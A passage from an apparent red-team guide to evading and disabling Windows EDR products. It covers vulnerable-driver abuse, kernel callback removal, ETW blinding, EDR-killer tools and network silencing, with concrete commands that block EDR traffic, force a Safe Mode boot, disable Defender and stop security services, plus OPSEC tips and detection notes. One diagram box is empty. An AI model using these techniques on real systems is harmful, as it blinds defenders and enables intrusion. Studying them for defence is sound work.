| `aswArPot.sys` | Avast Anti-Rootkit | Process termination |
| `zemana*.sys` | Zemana Anti-Malware | Kernel process termination |

**Driver signing loophole:** Drivers signed before July 29, 2015 with a valid cross-certificate are still accepted by Windows  even on Windows 11. The `truesight.sys` v2.0.2 exploits this: attackers generate thousands of hash variants of the same old signed driver to evade hash-based blocklists.

**Resource:** The [LOLDrivers project](https://loldrivers.io) maintains a curated database of 200+ known vulnerable drivers with hashes, signatures, and YARA rules.

> **Detection:** Sysmon Event 6 (Driver Loaded) for known vulnerable driver hashes. Microsoft's Vulnerable Driver Blocklist (via WDAC/HVCI). ASR rule `56A863A9-875C-4D65-AF7B-90D77AB80064` blocks known BYOVD drivers.

#### Kernel Callback Removal

With a kernel read/write primitive from BYOVD, enumerate and remove the EDR's registered callbacks:

```
┌─────────────────────────────────────────────────────────────────────┐
│              KERNEL CALLBACK REMOVAL FLOW                             │
└─────────────────────────────────────────────────────────────────────┘

  1. LOCATE ─── Pattern-scan ntoskrnl.exe in memory for
               PspCreateProcessNotifyRoutine array address
               (or resolve via PDB symbols / heuristic offsets)

  2. WALK ───── Iterate callback array entries (up to 64)
               Each entry: EX_CALLBACK_ROUTINE_BLOCK
               ├── RundownProtect
               └── Function pointer → callback function address

  3. IDENTIFY ─ For each callback, check if function address
               falls within EDR driver's loaded memory range
               (compare against MmGetSystemRoutineAddress output
                or EnumDeviceDrivers results)

  4. REMOVE ─── Option A: Zero the callback entry
               Option B: Replace function pointer with ret stub
               Option C: Unlink from array (set to NULL)

  5. REPEAT ─── Do the same for:
               ├── PspCreateThreadNotifyRoutine (thread callbacks)
               ├── PspLoadImageNotifyRoutine (image load callbacks)
               ├── ObCallback linked list (object callbacks)
               ├── CmCallbackListHead (registry callbacks)
               └── FLT_INSTANCE._CallbackNodes (minifilter I/O)

  Result: EDR driver still loaded but receives ZERO notifications
          → process creation invisible
          → DLL loads invisible
          → registry changes invisible
          → file I/O invisible
```

**Minifilter callback removal (EDRSandblast approach):**
The `_FLT_INSTANCE` structure contains an array of `_CALLBACK_NODE` entries. Each node is linked in a doubly-linked list for its specific I/O operation (IRP_MJ_CREATE, IRP_MJ_WRITE, etc.). By unlinking the EDR's callback nodes from these lists, file I/O events stop reaching the EDR's filter  making it blind to file drops, tool staging, and credential dumps.

**Tools:** EDRSandblast (Wavestone, DefCon 30), EDRSnowblast (Orange Cyberdefense fork with extras), CheekyBlinder

#### ETW-TI Blinding

Disable the Threat Intelligence ETW provider at the kernel level:

```
  ntoskrnl.exe contains the ETW-TI provider registration:

  EtwThreatIntProvRegHandle → _ETW_REG_ENTRY
                                └── GuidEntry → _ETW_GUID_ENTRY
                                                  └── ProviderEnableInfo
                                                       └── IsEnabled = 1

  Attack: use kernel write primitive to set IsEnabled = 0

  Result: all ETW-TI events stop being generated
          → VirtualAllocEx events disappear
          → WriteProcessMemory events disappear
          → NtSetContextThread events disappear
          → EDR loses its most sensitive telemetry source

  Alternative (broader): patch EtwWrite prologue in ntoskrnl
                          with 0xC3 (ret) → kills ALL kernel ETW
                          Warning: PatchGuard may detect this
```

> **OPSEC note:** Targeted patching of only the TI provider's IsEnabled flag is safer than patching `EtwWrite` globally. PatchGuard monitors some kernel code pages but its checks are periodic (minutes apart), and it does not comprehensively cover all ETW structures.

### EDR Killing  Process Termination

Instead of blinding the EDR's telemetry, directly kill its processes:

```
┌─────────────────────────────────────────────────────────────────────┐
│              EDR KILLING METHODS                                      │

  └─────────────────────────────────────────────────────────────────┘
```

**EDRKillShifter in detail:** First reported by Sophos in August 2024, linked to RansomHub ransomware. Functions as a loader that decrypts and loads an embedded vulnerable driver at runtime, then iterates through running processes to identify and kill EDR services. The "shifter" aspect refers to its ability to swap which vulnerable driver is embedded  making signature detection harder. By late 2024, EDRKillShifter was adopted by **Play**, **BianLian**, and **Medusa** ransomware groups  indicating cross-gang sharing and commoditization of EDR-killing capabilities.

**Terminator (SpyBoy):** Sold on underground forums  uses the legitimate Process Explorer driver (`procexp152.sys`) to terminate EDR/AV processes via its process-termination IOCTL. Claims to kill **24+ different vendors' EDR engines**.

### EDR Network Isolation  Cutting Communications

Even if the EDR agent is running and collecting telemetry, blocking its network traffic prevents alerts from reaching the SOC:

#### EDRSilencer  WFP Traffic Blocking

```
┌─────────────────────────────────────────────────────────────────────┐
│              WFP-BASED EDR SILENCING                                  │
└─────────────────────────────────────────────────────────────────────┘

  1. ENUMERATE ── CreateToolhelp32Snapshot() → find EDR process PIDs
     │            Match against hardcoded list of EDR process names:
     │            MsSense.exe, CylanceSvc.exe, SentinelAgent.exe,
     │            CSFalconService.exe, CbDefense.exe, ...
     │
  2. SESSION ─── FwpmEngineOpen0() → open WFP engine handle
     │
  3. SUBLAYER ── FwpmSubLayerAdd0() → create blocking sublayer
     │            High weight = high priority (overrides other filters)
     │
  4. FILTER ──── For each EDR process:
     │            FwpmFilterAdd0() with conditions:
     │            ├── Layer: FWPM_LAYER_ALE_AUTH_CONNECT_V4
     │            ├── Layer: FWPM_LAYER_ALE_AUTH_CONNECT_V6
     │            ├── Condition: match application ID (process path)
     │            └── Action: FWP_ACTION_BLOCK
     │
  Impact:
  ├── OUTBOUND blocked: no alerts to SOC, no telemetry upload,
  │   no cloud scanning, no sample submissions
  ├── INBOUND blocked: no policy updates, no containment commands,
  │   no new detection rules, no remote investigation queries
  └── SOC dashboard: endpoint appears healthy but silent
```

**Why WFP is preferred over firewall rules:**
- WFP filters are **not visible** through standard `netsh advfirewall` commands
- WFP operates below Winsock  the EDR's networking code gets connection failures with no clear indication of blocking
- WFP filters survive service restarts
- More surgical: can target specific processes without broad firewall rules

#### Firewall Rule Blocking (Simpler Alternative)

```powershell
# Block EDR outbound traffic via Windows Firewall COM API (INetFwPolicy2)
# Or via command line:
netsh advfirewall firewall add rule name="BlockEDR" dir=out program="C:\path\to\edr.exe" action=block
```

> **Detection:** Monitor for unexpected WFP filter creation (enumerate with `FwpmFilterEnum0`). EDR cloud backend should alert on heartbeat gaps  if an agent stops checking in, assume compromise. Windows Event IDs 4946/4947 log firewall rule changes.

### DLL Hijacking & Side-Loading Against EDR

Attackers have turned EDR vendors' own binaries against them:

```
┌─────────────────────────────────────────────────────────────────────┐
│              EDR DLL ATTACK CASE STUDIES                               │
└─────────────────────────────────────────────────────────────────────┘

  Case 1: ToddyCat APT vs ESET (CVE-2024-11859)
  ├── Target: ESET command-line scanner (ecls.exe)
  ├── Vulnerability: insecure load of version.dll from working dir
  ├── Exploit: dropped malicious version.dll alongside ecls.exe
  ├── Payload (TCESB): modified kernel structures to disable
  │   process creation and module loading notification callbacks
  └── Patched: January 2025

  Case 2: LockBit 3.0 vs Microsoft Defender (July 2022)
  ├── Target: MpCmdRun.exe (Defender CLI tool)
  ├── Method: paired legitimate exe with malicious MpClient.dll
  ├── Payload: DLL decrypts and executes Cobalt Strike Beacon
  └── Evasion: Microsoft-signed binary loads attacker code

  Case 3: EDR Updater Abuse
  ├── Many EDR agents have auto-update components
  ├── If updater loads DLLs from writable directories...
  └── Plant malicious DLL → updater loads it with SYSTEM privileges
```

### Service-Level EDR Attacks

#### Safe Mode Reboot Evasion

Most EDR agents **do not load in Windows Safe Mode**. Attackers exploit this:

```
  1. Register malware as a service with boot-start in Safe Mode
  2. Add registry Run key for persistence
  3. Force reboot into Safe Mode:
     bcdedit /set {current} safeboot minimal
     shutdown /r /t 0
  4. System boots in Safe Mode → EDR inactive
  5. Malware executes freely (encryption, exfiltration)
  6. Reboot back to normal mode
```

**Real-world usage:** Snatch ransomware (2019), AvosLocker (2023), Black Basta (2022)

#### Service Control Abuse

```powershell
# Disable Defender (if Tamper Protection is OFF)
Set-MpPreference -DisableRealtimeMonitoring $true
sc stop WinDefend

# Stop EDR service (if not tamper-protected)
sc stop <EDRServiceName>
net stop <EDRServiceName>

# Prevent service from starting on boot
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<EDRDriver>" /v Start /t REG_DWORD /d 4
```

> **Note:** Most enterprise EDRs have tamper protection that prevents service stopping. These techniques primarily work against misconfigured or consumer-grade products.



> **OPSEC Tip:** The EDR bypass landscape evolves rapidly. Techniques that work today may trigger detections within weeks of public disclosure.
